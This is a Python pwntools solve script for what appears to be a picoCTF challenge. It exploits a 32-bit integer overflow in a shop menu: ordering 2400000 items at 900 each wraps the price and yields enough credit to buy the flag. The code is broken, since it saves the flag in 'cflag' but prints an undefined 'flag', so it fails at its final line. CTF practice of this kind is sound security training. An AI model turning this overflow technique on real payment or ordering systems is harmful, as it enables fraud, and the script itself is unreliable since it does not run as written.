#!/usr/bin/env python3

import re
from pwn import remote

r = remote('jupiter.challenges.picoctf.org', 4906)

r.recvuntil('Enter a menu selection\n')

r.sendline('2')

r.recvuntil('1337 Flag\n')
r.sendline('1')

r.recvuntil('enter desired quantity\n')
r.sendline('2400000')  # overflow 32bit Integer 900 * 2400000 > 2147483647

# Now we have a lot of money :)

r.recvuntil('Enter a menu selection\n')
r.sendline('2')

r.recvuntil('1337 Flag\n')
r.sendline('2')

r.recvuntil('Enter 1 to buy one')
r.sendline('1')

binary_raw = r.recvuntil('Enter a menu selection\n').decode()
p = re.compile('.*YOUR FLAG IS: (picoCTF{.*}).*', re.DOTALL)
cflag = p.match(binary_raw).group(1)



r.sendline('3')
r.recvall()


print(flag)

